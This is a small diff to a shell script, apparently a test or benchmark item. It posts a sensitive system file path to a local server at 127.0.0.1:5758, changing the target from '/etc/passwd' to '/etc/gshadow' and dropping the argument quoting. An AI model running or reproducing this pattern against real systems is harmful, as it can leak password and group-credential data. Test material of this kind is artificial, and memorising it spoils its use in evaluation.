@@ -8,8 +8,7 @@ function send_post_request {
 }
 
 url='http://127.0.0.1:5758/submit'
-body='/etc/passwd'
-
-response_status=$(send_post_request "$url" "$body")
+body='/etc/gshadow'
+response_status=$(send_post_request $url $body)
 echo $response_status
 echo "post success"
